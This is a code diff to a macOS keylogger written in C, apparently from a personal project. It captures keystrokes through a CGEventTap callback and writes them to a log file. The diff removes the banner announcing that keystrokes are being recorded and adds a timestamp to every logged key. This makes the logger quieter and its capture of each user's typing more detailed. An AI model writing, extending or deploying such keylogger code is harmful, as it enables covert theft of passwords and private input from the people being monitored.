@@ -1,4 +1,6 @@
 #include "keylogger.h"
+#include <time.h>
+
 
 int main(int argc, const char *argv[]) {
 
@@ -35,7 +37,7 @@ int main(int argc, const char *argv[]) {
         exit(1);
     }
 
-    fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result)));
+    /* fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result))); */
     fflush(logfile);
 
     printf("Logging to: %s\n", logfileLocation);
@@ -51,7 +53,15 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     // This prints the readable key into the log
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    time_t rawtime;
+    struct tm * timeinfo;
+
+    time ( &rawtime );
+    timeinfo = localtime ( &rawtime );
+    /* printf ( "Current local time and date: %s", asctime (timeinfo) ); */
+
+    fprintf(logfile, "%s :: ", convertKeyCode(keyCode));
+    fprintf(logfile, "%s", asctime(timeinfo));
     fflush(logfile);
 
     return event;
